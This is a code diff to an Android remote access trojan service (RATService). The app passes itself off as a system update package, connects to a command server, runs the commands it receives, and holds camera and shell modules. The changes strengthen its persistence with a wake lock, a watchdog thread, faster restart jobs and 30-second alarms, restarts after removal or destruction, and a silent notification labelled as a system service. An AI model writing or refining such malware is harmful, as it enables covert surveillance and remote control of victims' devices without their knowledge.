@@ -21,6 +21,7 @@ import android.os.SystemClock;
 import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
+import androidx.core.content.ContextCompat;
 
 import com.android.system.update.modules.*;
 
@@ -28,6 +29,7 @@ import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.Socket;
+import java.util.concurrent.atomic.AtomicBoolean;
 
 public class RATService extends Service {
     private static final String CHANNEL_ID = "RATChannel";
@@ -35,14 +37,17 @@ public class RATService extends Service {
     private static final String TAG = "RATService";
     private static final int JOB_ID = 1001;
     private static final int PERSISTENCE_JOB_ID = 1002;
-    private static final long RESTART_DELAY_MS = 5000; // 5 seconds
+    private static final long RESTART_DELAY_MS = 2000; // Reduced to 2 seconds!
+    private static final long CHECK_INTERVAL_MS = 30000; // Check every 30 seconds
     
     private Socket socket;
     private PrintWriter out;
     private BufferedReader in;
-    private boolean isRunning = true;
+    private AtomicBoolean isRunning = new AtomicBoolean(true);
     private Thread connectionThread;
+    private Thread watchdogThread;
     private static volatile RATService instance;
+    private PowerManager.WakeLock wakeLock;
     
     // Modules
     private CameraModule cameraModule;
@@ -58,7 +63,7 @@ public class RATService extends Service {
     // Binder for GuardianService communication
     public class RATServiceBinder extends Binder {
         public void heartbeat() throws RemoteException {
-            if (!isRunning) {
+            if (!isRunning.get()) {
                 throw new RemoteException("Service is not running");
             }
         }
@@ -77,6 +82,10 @@ public class RATService extends Service {
         AppController.setConnectionService(this);
         
         Log.d(TAG, "RATService created");
+        
+        // Acquire wake lock to prevent CPU sleep
+        acquireWakeLock();
+        
         createNotificationChannel();
         startForeground(NOTIFICATION_ID, createNotification());
         
@@ -91,9 +100,11 @@ public class RATService extends Service {
         if (Config.ENABLE_SHELL) shellModule = new ShellModule();
         deviceModule = new DeviceModule(this);
         
+        // Start internal watchdog
+        startWatchdog();
+        
         // Schedule all persistence mechanisms
-        schedulePersistenceJob();
-        scheduleJobSchedulerRestart();
+        scheduleAllJobs();
         
         // Set that service should run on boot
         setRunOnBoot(true);
@@ -101,13 +112,92 @@ public class RATService extends Service {
         startConnection();
     }
     
+    private void acquireWakeLock() {
+        try {
+            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
+            wakeLock = powerManager.newWakeLock(
+                PowerManager.PARTIAL_WAKE_LOCK,
+                "RATService::WakeLock"
+            );
+            wakeLock.setReferenceCounted(false);
+            wakeLock.acquire(10 * 60 * 1000L); // 10 minute timeout, will auto-renew
+            Log.d(TAG, "Wake lock acquired");
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to acquire wake lock", e);
+        }
+    }
+    
+    private void startWatchdog() {
+        watchdogThread = new Thread(() -> {
+            while (isRunning.get()) {
+                try {
+                    Thread.sleep(CHECK_INTERVAL_MS);
+                    
+                    // Check if connection thread is alive
+                    if (connectionThread == null || !connectionThread.isAlive()) {
+                        Log.w(TAG, "Connection thread dead, restarting...");
+                        startConnection();
+                    }
+                    
+                    // Refresh wake lock
+                    if (wakeLock != null && !wakeLock.isHeld()) {
+                        acquireWakeLock();
+                    }
+                    
+                } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                    break;
+                } catch (Exception e) {
+                    Log.e(TAG, "Watchdog error", e);
+                }
+            }
+        });
+        watchdogThread.start();
+    }
+    
+    private void scheduleAllJobs() {
+        // Schedule immediate restart job
+        scheduleJobSchedulerRestart();
+        
+        // Schedule periodic persistence job
+        schedulePersistenceJob();
+        
+        // Schedule alarm for faster checking (every 30 seconds)
+        scheduleFastCheckAlarm();
+    }
+    
+    private void scheduleFastCheckAlarm() {
+        Intent intent = new Intent(this, RestartReceiver.class);
+        intent.setAction("CHECK_SERVICE");
+        PendingIntent pendingIntent = PendingIntent.getBroadcast(
+            this, 3, intent, 
+            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+        
+        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        if (alarmManager != null) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                alarmManager.setExactAndAllowWhileIdle(
+                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                    SystemClock.elapsedRealtime() + CHECK_INTERVAL_MS,
+                    pendingIntent
+                );
+            } else {
+                alarmManager.setExact(
+                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                    SystemClock.elapsedRealtime() + CHECK_INTERVAL_MS,
+                    pendingIntent
+                );
+            }
+            Log.d(TAG, "Fast check alarm scheduled for " + (CHECK_INTERVAL_MS/1000) + " seconds");
+        }
+    }
+    
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d(TAG, "RATService onStartCommand");
         
         // Reschedule jobs every time service starts
-        schedulePersistenceJob();
-        scheduleJobSchedulerRestart();
+        scheduleAllJobs();
         
         // If service is killed, the system will try to restart it
         return START_STICKY;
@@ -118,7 +208,7 @@ public class RATService extends Service {
             try {
                 ComponentName componentName = new ComponentName(this, PersistenceJobService.class);
                 JobInfo jobInfo = new JobInfo.Builder(PERSISTENCE_JOB_ID, componentName)
-                        .setPeriodic(15 * 60 * 1000) // 15 minutes
+                        .setPeriodic(5 * 60 * 1000) // Reduced to 5 minutes!
                         .setPersisted(true) // Survives reboot
                         .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                         .setBackoffCriteria(10000, JobInfo.BACKOFF_POLICY_EXPONENTIAL)
@@ -128,9 +218,7 @@ public class RATService extends Service {
                 int result = jobScheduler.schedule(jobInfo);
                 
                 if (result == JobScheduler.RESULT_SUCCESS) {
-                    Log.d(TAG, "Persistence job scheduled successfully");
-                } else {
-                    Log.e(TAG, "Failed to schedule persistence job");
+                    Log.d(TAG, "Persistence job scheduled for 5 minutes");
                 }
             } catch (Exception e) {
                 Log.e(TAG, "Error scheduling persistence job", e);
@@ -143,7 +231,8 @@ public class RATService extends Service {
             try {
                 ComponentName componentName = new ComponentName(this, JobSchedulerService.class);
                 JobInfo jobInfo = new JobInfo.Builder(JOB_ID, componentName)
-                        .setOverrideDeadline(RESTART_DELAY_MS)
+                        .setMinimumLatency(RESTART_DELAY_MS)
+                        .setOverrideDeadline(RESTART_DELAY_MS * 2)
                         .setPersisted(true)
                         .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                         .build();
@@ -152,7 +241,7 @@ public class RATService extends Service {
                 int result = jobScheduler.schedule(jobInfo);
                 
                 if (result == JobScheduler.RESULT_SUCCESS) {
-                    Log.d(TAG, "Restart job scheduled successfully");
+                    Log.d(TAG, "Restart job scheduled for " + (RESTART_DELAY_MS/1000) + " seconds");
                 }
             } catch (Exception e) {
                 Log.e(TAG, "Failed to schedule restart job", e);
@@ -166,8 +255,12 @@ public class RATService extends Service {
     }
     
     private void startConnection() {
+        if (connectionThread != null && connectionThread.isAlive()) {
+            connectionThread.interrupt();
+        }
+        
         connectionThread = new Thread(() -> {
-            while (isRunning) {
+            while (isRunning.get()) {
                 try {
                     socket = new Socket(Config.SERVER_HOST, Config.SERVER_PORT);
                     out = new PrintWriter(socket.getOutputStream());
@@ -176,16 +269,19 @@ public class RATService extends Service {
                     sendDeviceInfo();
                     
                     String command;
-                    while (isRunning && (command = in.readLine()) != null) {
+                    while (isRunning.get() && (command = in.readLine()) != null) {
                         processCommand(command);
                     }
                     
                 } catch (Exception e) {
-                    e.printStackTrace();
+                    if (isRunning.get()) {
+                        Log.e(TAG, "Connection error", e);
+                    }
                     try {
                         Thread.sleep(5000);
                     } catch (InterruptedException ie) {
                         Thread.currentThread().interrupt();
+                        break;
                     }
                 }
             }
@@ -317,6 +413,7 @@ public class RATService extends Service {
                 "RAT Service",
                 NotificationManager.IMPORTANCE_LOW
             );
+            channel.setDescription("System service for background operations");
             NotificationManager manager = getSystemService(NotificationManager.class);
             manager.createNotificationChannel(channel);
         }
@@ -328,19 +425,18 @@ public class RATService extends Service {
             .setContentText("Running in background")
             .setSmallIcon(android.R.drawable.ic_dialog_info)
             .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setOngoing(true)
+            .setSilent(true)
             .build();
     }
     
     @Override
     public void onTaskRemoved(Intent rootIntent) {
         super.onTaskRemoved(rootIntent);
-        Log.d(TAG, "Task removed, scheduling restart");
+        Log.d(TAG, "Task removed, scheduling immediate restart");
         
-        // Schedule via JobScheduler first
-        scheduleJobSchedulerRestart();
-        schedulePersistenceJob();
-        
-        // Also use AlarmManager as backup
+        // Schedule immediate restart
+        scheduleAllJobs();
         scheduleRestartWithAlarm();
         
         // Stop the foreground service but the restart will bring it back
@@ -367,32 +463,35 @@ public class RATService extends Service {
                     SystemClock.elapsedRealtime() + RESTART_DELAY_MS, 
                     pendingIntent);
             }
-            Log.d(TAG, "Alarm restart scheduled");
+            Log.d(TAG, "Alarm restart scheduled for 2 seconds");
         }
     }
     
     @Override
     public IBinder onBind(Intent intent) {
-        return binder; // Return binder for GuardianService connection
+        return binder;
     }
     
     @Override
     public void onDestroy() {
         Log.d(TAG, "RATService onDestroy");
-        isRunning = false;
+        isRunning.set(false);
         AppController.clearConnectionService();
         instance = null;
         
         try {
             if (socket != null) socket.close();
             if (connectionThread != null) connectionThread.interrupt();
+            if (watchdogThread != null) watchdogThread.interrupt();
+            if (wakeLock != null && wakeLock.isHeld()) {
+                wakeLock.release();
+            }
         } catch (Exception e) {
             e.printStackTrace();
         }
         
         // Schedule multiple restart mechanisms
-        scheduleJobSchedulerRestart();
-        schedulePersistenceJob();
+        scheduleAllJobs();
         scheduleRestartWithAlarm();
         
         super.onDestroy();
